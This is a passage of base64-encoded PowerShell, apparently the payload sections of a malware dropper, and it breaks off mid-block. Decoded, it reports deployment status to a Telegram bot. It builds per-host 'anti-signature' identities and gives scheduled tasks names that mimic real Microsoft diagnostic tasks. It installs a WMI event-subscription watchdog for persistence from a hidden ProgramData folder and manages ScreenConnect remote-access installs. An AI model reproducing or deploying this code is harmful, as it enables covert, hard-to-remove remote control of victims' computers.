U2VuZC1UZyhbc3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUpIHsNCiAgICAkcGF5bG9hZCA9IEB7
DQogICAgICAgIGNoYXRfaWQgICAgICAgICAgICAgICAgICA9ICRjZmcuQ0hBVF9JRA0KICAgICAg
ICB0ZXh0ICAgICAgICAgICAgICAgICAgICAgPSAkbXNnDQogICAgICAgIGRpc2FibGVfd2ViX3Bh
Z2VfcHJldmlldyA9ICR0cnVlDQogICAgfQ0KICAgIGlmICgkbW9kZSkgeyAkcGF5bG9hZC5wYXJz
ZV9tb2RlID0gJG1vZGUgfQ0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAt
Q29tcHJlc3MgLURlcHRoIDUNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpV
VEY4LkdldEJ5dGVzKCRqc29uKQ0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgKCJodHRwczov
L2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkY2ZnLkJPVF9UT0tFTikvc2VuZE1lc3NhZ2UiKSBgDQog
ICAgICAgIC1NZXRob2QgUG9zdCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlv
bi9qc29uOyBjaGFyc2V0PXV0Zi04JyB8IE91dC1OdWxsDQp9DQoNCmZ1bmN0aW9uIFNlbmQtVGdT
YWZlKFtzdHJpbmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICR0b1NlbmQgPSAkbXNnDQog
ICAgdHJ5IHsNCiAgICAgICAgU2VuZC1UZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUNCiAgICAg
ICAgcmV0dXJuICR0cnVlDQogICAgfSBjYXRjaCB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAg
ICBTZW5kLVRnIC1tc2cgKCR0b1NlbmQuU3Vic3RyaW5nKDAsIDMwMDApICsgImBuPGk+VFJVTkNB
VEVEPC9pPiIpIC1tb2RlICRtb2RlDQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAg
fSBjYXRjaCB7DQogICAgICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgICAgIH0NCiAgICB9DQp9
DQoNCnRyeSB7DQogICAgaWYgKFNlbmQtVGdTYWZlIC1tc2cgJHRleHQgLW1vZGUgJ0hUTUwnKSB7
DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAndGdfc2VudF9y
aWNoJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gZWxzZSB7DQogICAgICAg
IHRocm93ICdodG1sX2ZhaWxlZCcNCiAgICB9DQogICAgaWYgKCRrZXkgLWVxICdERVBMT1knKSB7
DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoInRnX2RlcGxv
eV9vaz0iICsgJGRlcGxveU9rKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAg
ICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnZGVwbG95X3Rn
LmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlIC1Gb3JtYXQgJ28nKSAtRXJyb3JBY3Rpb24gU2lsZW50
bHlDb250aW51ZQ0KICAgIH0NCn0gY2F0Y2ggew0KICAgIHRyeSB7DQogICAgICAgICRwbGFpbiA9
IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpDQogICAgICAgICRwbGFpbiA9
IFtTeXN0ZW0uTmV0LldlYlV0aWxpdHldOjpIdG1sRGVjb2RlKCRwbGFpbikNCiAgICAgICAgaWYg
KCRwbGFpbi5MZW5ndGggLWd0IDM1MDApIHsgJHBsYWluID0gJHBsYWluLlN1YnN0cmluZygwLCAz
NTAwKSArICJgblRSVU5DQVRFRCIgfQ0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRwbGFpbiAt
bW9kZSAnJyB8IE91dC1OdWxsDQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9n
IC1WYWx1ZSAndGdfc2VudF9wbGFpbicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAg
ICB9IGNhdGNoIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVl
ICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlDQogICAgfQ0KfQ0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDkKIyBTaGFyZWQgbGlicmFyeTogcGVyLWhvc3QgaWRlbnRpdHkgKGFudGkt
c2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nCiMgKG11dHVhbCBwZXJzaXN0ZW5jZSBjaGFpbiksIGNh
bXBhaWduIHN0YXRlIGZpbGUsIFNDIHNlcnZpY2UgcmVwYWlyLgojIEw4OiBUZXN0LVNDUmVnaXN0
ZXJlZCBmaXhlZCAoRm9yRWFjaC1PYmplY3QgcmV0dXJuIG5ldmVyIGxlZnQgZnVuY3Rpb24pOwoj
ICAgICBEaXNwbGF5TmFtZSAtaWVxIGV4YWN0IG1hdGNoOyByZXBhaXIgR1VJRCB3YWxrIHVzZXMg
Zm9yZWFjaDsKIyAgICAgU0MgcmVzZWFyY2g6IHBlci1GUCBVcGdyYWRlQ29kZSArIGxlZ2FjeSBm
YW1pbHkgVXBncmFkZSByb3dzIG1lYW4KIyAgICAgbXNpZXhlYyAvaSBvZiBwcmltYXJ5IGNhbiBy
ZW1vdmUgc2libGluZ3MgLSBwcmVmZXIgL2ZhIGFsd2F5cy4KIyBMNzogRklYRUQgV09XNjQzMk5v
ZGUgdW5pbnN0YWxsIGhpdmUgcGF0aDsgaGFyZGVuZWQgSW52b2tlLUV4dGVybWluYXRlLgojIEF1
dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5
LgojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkApbQ21kbGV0QmluZGluZygpXQpwYXJhbSgKICAgIFtQYXJh
bWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgW1ZhbGlkYXRlU2V0KCdpbml0JywgJ3dhdGNo
ZG9nJywgJ3dhdGNoZG9nLWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0eScsICdyZXBhaXInLCAn
cmVnaXN0ZXJlZCcsICdleHRlcm1pbmF0ZScpXQogICAgW3N0cmluZ10kQWN0aW9uLAogICAgW3N0
cmluZ10kV29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVt
cFwud3VjYWNoZScsCiAgICBbc3RyaW5nXSRNb25QYXRoID0gJycsCiAgICBbc3RyaW5nXSRCdWls
ZCAgPSAnTzE1JywKICAgIFtzdHJpbmddJEV4dHJhICA9ICcnLAogICAgW3N0cmluZ10kRnAgICAg
ID0gJycKKQoKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwokY2Zn
UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRpdHkuY2ZnJwokSWRlbnRWZXJzaW9uID0g
NQoKIyBMZWdpdC1sb29raW5nIHRhc2stbmFtZSBwb29sczsgcGVyLWhvc3QgaGFzaCBwaWNrcyBv
bmUgcGVyIHNsb3QuCiMgdjI6IE9OTFkgcGFyZW50IGZvbGRlcnMgdGhhdCBleGlzdCBvbiBldmVy
eSBXaW4xMC8xMSAoV3dhblN2Yy9NZW1vcnlEaWFnbm9zdGljLwojIFBvd2VyRWZmaWNpZW5jeS9E
aXNrRGlhZ25vc3RpYyBwYXJlbnRzIGFyZSBhYnNlbnQgb24gc29tZSBtYWNoaW5lcyAtPiAvQ3Jl
YXRlIGZhaWxlZCkuCiRQb29scyA9IEB7CiAgICBBID0gQCgnXE1pY3Jvc29mdFxXaW5kb3dzXERp
YWdub3Npc1xTY2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENvbnN1
bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhlck5ldHdvcmtJbmZvJywnXE1p
Y3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcsJ1xNaWNyb3NvZnRcV2luZG93c1xQ
TEFcU2VydmVyIERpYWdub3N0aWNzJywnXE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVz
c0NvbmZsaWN0MScsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyJywnXE1pY3Jvc29mdFxX
aW5kb3dzXERpYWdub3Npc1xTUlRhc2snKQogICAgQiA9IEAoJ1xNaWNyb3NvZnRcV2luZG93c1xQ
TEFcU2VydmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcsJ1xNaWNy
b3NvZnRcV2luZG93c1xEaWFnbm9zaXNcQlZUQ29uc3VtZXInLCdcTWljcm9zb2Z0XFdpbmRvd3Nc
TmV0VHJhY2VcR2F0aGVyTmV0d29ya0luZm8nLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lz
XFNjaGVkdWxlZCcsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGljdDIn
LCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlciBEaWFnbm9zdGljcycsJ1xNaWNyb3NvZnRc
V2luZG93c1xEaWFnbm9zaXNcU1JUYXNrJykKICAgIEMgPSBAKCdcTWljcm9zb2Z0XFdpbmRvd3Nc
V0RJXFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhlck5l
dHdvcmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScs
J1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcQlZUQ29uc3VtZXInLCdcTWljcm9zb2Z0XFdp
bmRvd3NcUExBXFNlcnZlcicsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2NoZWR1bGVk
JywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgRGlhZ25vc3RpY3MnLCdcTWljcm9zb2Z0
XFdpbmRvd3NcRGlhZ25vc2lzXFNSVGFzaycpCiAgICBEID0gQCgnXE1pY3Jvc29mdFxXaW5kb3dz
XFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScsJ1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1
dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRvd3NcTmV0VHJhY2VcR2F0aGVyTmV0d29ya0luZm8n
LCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENvbnN1bWVyJywnXE1pY3Jvc29mdFxX
aW5kb3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNjaGVkdWxl
ZCcsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyIERpYWdub3N0aWNzJywnXE1pY3Jvc29m
dFxXaW5kb3dzXERpYWdub3Npc1xTUlRhc2snKQp9CiREZWZhdWx0cyA9IFtvcmRlcmVkXUB7CiAg
ICBUQVNLX0EgPSAnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnCiAgICBU
QVNLX0IgPSAnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInCiAgICBUQVNLX0MgPSAnXE1p
Y3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcKICAgIFRBU0tfRCA9ICdcTWljcm9z
b2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxpY3QxJwogICAgTU9fQSAgID0gJzInCiAg
ICBNT19CICAgPSAnMycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsKICAgICRzID0gMEwKICAg
IGZvcmVhY2ggKCRjIGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJBcnJheSgp
KSB7ICRzID0gKCRzICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQogICAgcmV0dXJuICRz
Cn0KCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkK
ICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAo
R2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsKICAgICAgICAgICAg
aWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZFsk
bWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRp
ZAp9CgpmdW5jdGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7CiAgICBpZiAoJHRu
KSB7ICYgc2NodGFza3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYxIHwgT3V0LU51bGwgfQp9
CgpmdW5jdGlvbiBJbml0aWFsaXplLUlkZW50aXR5IHsKICAgICMgSWRlbXBvdGVudCB3aXRoaW4g
YW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4gUG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOgogICAg
IyBvbGQtbmFtZSB0YXNrcyBhcmUgZGVsZXRlZCwgdGhlbiBpZGVudGl0eSBpcyByZWdlbmVyYXRl
ZCBmcm9tIHRoZSBzYW1lIHNlZWQuCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAg
ICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkKICAgICAgICAjIEw3OiBhbHNvIHJlZ2VuZXJhdGUgaWYg
YW55IFRBU0tfKiBpcyBlbXB0eSAoTDQtTDYgbW9kdWxvL2Nhc3QgYnVncyBsZWZ0IGJsYW5rIHNs
b3RzKQogICAgICAgICRzbG90c09rID0gKCRvbGRbJ0lERU5UVkVSJ10gLWVxICIkSWRlbnRWZXJz
aW9uIikgLWFuZCAkb2xkWydUQVNLX0EnXSAtYW5kICRvbGRbJ1RBU0tfQiddIC1hbmQgJG9sZFsn
VEFTS19DJ10gLWFuZCAkb2xkWydUQVNLX0QnXQogICAgICAgIGlmICgkc2xvdHNPaykgeyByZXR1
cm4gJG9sZCB9CiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tf
QycsJ1RBU0tfRCcpIHsgUmVtb3ZlLVRhc2tRdWlldCAkb2xkWyRrXSB9CiAgICAgICAgUmVtb3Zl
LUl0ZW0gLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZQogICAgfQogICAgJHMgPSBHZXQtSG9z
dFNlZWQKICAgICMgTDQ6IHR3byBzbG90cyBtYXkgaGFzaCB0byB0aGUgc2FtZSB0YXNrIHBhdGgg
KHBvb2xzIHNoYXJlIG5hbWVzKSAtPgogICAgIyBvbmUgcGh5c2ljYWwgdGFzayB0aGVuIHNhdGlz
ZmllcyB0d28gc2xvdHMgYW5kIHRoZSBmbGVldCBzaG93cyAzLzQuCiAgICAjIFdhbGsgZWFjaCBw
b29sIGZvcndhcmQgdW50aWwgdGhlIHBpY2sgaXMgdW5pcXVlIGFjcm9zcyBzbG90cy4KICAgICMg
TDY6IHRoZSBvbGQgQChAKCdBJywgJHMgJSA4KSwgLi4uKSBmb3JtIHdhcyBkb3VibGUtYnJva2Vu
IGluIFBTIDUuMToKICAgICMgYmFyZSAlIGluc2lkZSBAKCkgcGFyc2VzIGFzIHRoZSBGb3JFYWNo
LU9iamVjdCBhbGlhcyAobm90IG1vZHVsbyksIHNvIHRoZQogICAgIyBjb2xsZWN0aW9uIGNvbGxh
cHNlZCBhbmQgdGhlIGxvb3AgbmV2ZXIgcmFuIC0+IGlkZW50aXR5LmNmZyBoYWQgRU1QVFkKICAg
ICMgVEFTS18qIGFuZCB0aGUgd2hvbGUgZmxlZXQgZmVsbCBiYWNrIHRvIGlkZW50aWNhbCBkZWZh
dWx0IHRhc2sgbmFtZXMuCiAgICAkc2VlZHMgPSBbb3JkZXJlZF1AewogICAgICAgIEEgPSAoJHMg
JSA4KQogICAgICAgIEIgPSAoKCRzICsgMykgJSA4KQogICAgICAgIEMgPSAoKCRzICsgNSkgJSA4
KQogICAgICAgIEQgPSAoKCRzICsgNykgJSA4KQogICAgfQogICAgJHBpY2sgPSBbb3JkZXJlZF1A
e30KICAgIGZvcmVhY2ggKCRsZXR0ZXIgaW4gJ0EnLCdCJywnQycsJ0QnKSB7CiAgICAgICAgJGkg
PSBbaW50XSRzZWVkc1skbGV0dGVyXQogICAgICAgICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRp
XQogICAgICAgICRuID0gMAogICAgICAgIHdoaWxlICgkcGljay5WYWx1ZXMgLWNvbnRhaW5zICRu
YW1lIC1hbmQgJG4gLWx0IDgpIHsgJGkgPSAoJGkgKyAxKSAlIDg7ICRuYW1lID0gJFBvb2xzWyRs
ZXR0ZXJdWyRpXTsgJG4rKyB9CiAgICAgICAgaWYgKC1ub3QgJG5hbWUpIHsgJG5hbWUgPSAkRGVm
YXVsdHNbIlRBU0tfJGxldHRlciJdIH0KICAgICAgICAkcGlja1skbGV0dGVyXSA9ICRuYW1lCiAg
ICB9CiAgICAkY2ZnID0gQCgKICAgICAgICAiVEFTS19BPSQoJHBpY2suQSkiCiAgICAgICAgIlRB
U0tfQj0kKCRwaWNrLkIpIgogICAgICAgICJUQVNLX0M9JCgkcGljay5DKSIKICAgICAgICAiVEFT
S19EPSQoJHBpY2suRCkiCiAgICAgICAgIk1PX0E9JCgyICsgKCRzICUgNCkpIiAgICAgICAgICAj
IDItNSBtaW4gaml0dGVyCiAgICAgICAgIk1PX0I9JCgzICsgKCgkcyArIDEpICUgMykpIiAgICAj
IDMtNSBtaW4gaml0dGVyCiAgICAgICAgIlNFRUQ9JHMiCiAgICAgICAgIklERU5UVkVSPSRJZGVu
dFZlcnNpb24iCiAgICApCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLVZh
bHVlICRjZmcgLUZvcmNlCiAgICByZXR1cm4gKFJlYWQtSWRlbnRpdHkpCn0KCmZ1bmN0aW9uIFJl
bW92ZS1XYXRjaGRvZyB7CiAgICBmb3JlYWNoICgkY2xzIGluIEAoJ19fRmlsdGVyVG9Db25zdW1l
ckJpbmRpbmcnLCdfX0V2ZW50RmlsdGVyJywnQ29tbWFuZExpbmVFdmVudENvbnN1bWVyJywnX19J
bnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24nKSkgewogICAgICAgIEdldC1XbWlPYmplY3QgLU5hbWVz
cGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNscyAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAgICAgICAoJF8u
TmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRvZ0YnKSAtb3IgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0
Y2hkb2dDJykgLW9yCiAgICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRj
aGRvZycpIC1vcgogICAgICAgICAgICAgICAgKCRfLkZpbHRlciAtYW5kICRfLkZpbHRlci5Ub1N0
cmluZygpIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionKSAtb3IKICAgICAgICAgICAgICAgICgk
Xy5Db25zdW1lciAtYW5kICRfLkNvbnN1bWVyLlRvU3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0
Y2hkb2dDKicpCiAgICAgICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwg
T3V0LU51bGwgfQogICAgfQp9CgpmdW5jdGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsKICAgIGlmICgt
bm90ICRNb25QYXRoKSB7IHJldHVybiAkZmFsc2UgfQogICAgUmVtb3ZlLVdhdGNoZG9nCiAgICAk
b2sgPSAkdHJ1ZQogICAgdHJ5IHsKICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSBy
b290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYAogICAg
ICAgICAgICAtQXJndW1lbnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2
YWxNaWxsaXNlY29uZHMgPSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51
bGwKICAgICAgICAkZiA9IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0
aW9uIC1DbGFzcyBfX0V2ZW50RmlsdGVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1l
ID0gJ1d1Y2FjaGVXYXRjaGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVl
cnlMYW5ndWFnZSA9ICdXUUwnOwogICAgICAgICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNF
TEVDVCAqIEZST00gX19UaW1lckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyci
IH0KICAgICAgICAkYyA9IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0
aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgYAogICAgICAgICAgICAtQXJndW1l
bnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAi
Y21kLmV4ZSAvYyBgIiRNb25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0KICAg
ICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3Mg
X19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgRmls
dGVyID0gJGY7IENvbnN1bWVyID0gJGMgfSB8IE91dC1OdWxsCiAgICB9IGNhdGNoIHsgJG9rID0g
JGZhbHNlIH0KICAgIHJldHVybiAkb2sKfQoKZnVuY3Rpb24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsK
ICAgICR0ID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFz
cyBfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbiAtRmlsdGVyICJUaW1lcklkPSdXdWNhY2hlV2F0
Y2hkb2cnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGYgPSBHZXQtV21pT2Jq
ZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZp
bHRlciAiTmFtZT0nV3VjYWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlCiAgICAkYyA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAt
Q2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRj
aGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGIgPSAkbnVsbAogICAg
aWYgKCRmIC1hbmQgJGMpIHsKICAgICAgICAkYiA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSBy
b290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkZp
bHRlciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJyAtYW5kICRfLkNvbnN1bWVyIC1saWtlICcq
V3VjYWNoZVdhdGNoZG9nQyonIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAx
CiAgICB9CiAgICByZXR1cm4gW2Jvb2xdKCR0IC1hbmQgJGYgLWFuZCAkYyAtYW5kICRiKQp9Cgpm
dW5jdGlvbiBFbnN1cmUtV2F0Y2hkb2cgewogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyBy
ZXR1cm4gJ09LJyB9CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0K
ICAgIGlmIChJbnN0YWxsLVdhdGNoZG9nKSB7IHJldHVybiAnUkVBUk1FRCcgfQogICAgcmV0dXJu
ICdGQUlMJwp9CgojIENvcnJlY3QgMzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVh
cmxpZXIgdXNlZCBhIHRydW5jYXRlZAojIFdPVzY0MzJOb2RlIHBhdGggKG1pc3NpbmcgTWljcm9z
b2Z0XFdpbmRvd3MpIHNvIEVWRVJZIDMyLWJpdCBTQyBwcm9kdWN0CiMgd2FzIGludmlzaWJsZSB0
byByZXBhaXIvZXh0ZXJtaW5hdGUvcmVnaXN0ZXJlZC4KJHNjcmlwdDpVbmluc3RhbGxSb290cyA9
IEAoCiAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25c
VW5pbnN0YWxsJywKICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2lu
ZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnCikKCmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3Rl
cmVkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICAjIEw4OiBORVZFUiB1c2UgcmV0dXJuIGlu
c2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhpdHMgdGhlCiAgICAjIHBpcGVsaW5lIGl0
ZXJhdGlvbiwgc28gdGhpcyBmdW5jdGlvbiBhbHdheXMgZmVsbCB0aHJvdWdoIHRvICdubycKICAg
ICMgYW5kIHRoZSBtb24gb3JwaGFuLWxhZGRlciBkZWxldGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBz
ZXJ2aWNlcy4KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9CiAgICAk
bmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgIGZvcmVhY2gg
KCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVz
dC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0
LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAg
ICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRu
